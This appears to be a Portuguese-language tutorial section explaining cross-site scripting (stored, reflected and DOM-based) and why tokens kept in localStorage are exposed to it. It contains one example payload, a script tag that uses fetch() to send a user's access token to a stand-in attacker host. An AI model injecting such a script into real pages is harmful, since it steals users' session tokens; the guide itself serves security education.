## 1. XSS (Cross-Site Scripting): O Inimigo Interno
O XSS ocorre quando um invasor consegue injetar código JavaScript malicioso em uma página web que é visualizada por outros usuários. O navegador da vítima confia no código porque ele parece vir legitimamente do seu site.

## Como funciona na prática?
Imagine que sua aplicação tem um sistema de comentários.

1. O invasor posta um comentário contendo a seguinte string:
```powershell
<script>fetch('https://malicioso.com/roubar?token=' + localStorage.getItem('accessToken'))</script>
```
2. O seu backend salva isso no banco de dados sem sanitizar (limpar as tags HTML).

3. Quando um usuário legítimo acessa a página, o frontend renderiza esse comentário.

4. O navegador do usuário vê a tag <script> e a executa silenciosamente em background.

5. O token é roubado.

## Tipos de XSS:

1. Stored (Persistente): O script malicioso é salvo no seu banco de dados (como no exemplo do comentário) e atinge todo mundo que carregar aquela informação. É o mais perigoso.

2. Reflected (Refletido): O script vai na URL (ex: seusite.com/busca?q=<script>...) e o backend reflete isso na página de resposta. O invasor precisa convencer a vítima a clicar no link malicioso.

3. DOM-based: O problema ocorre inteiramente no lado do cliente (frontend). O JavaScript da sua própria página pega um dado da URL ou de outro lugar não confiável e o insere no DOM (ex: usando innerHTML) sem tratamento.

## A Relação com o localStorage:
O localStorage é de acesso global para qualquer JavaScript rodando naquele domínio. Se você tem um único buraco de XSS em qualquer lugar da sua aplicação (até mesmo em uma biblioteca de terceiros desatualizada), o seu token será comprometido. O atacante tem "passe livre" para agir em nome do usuário até o token expirar.
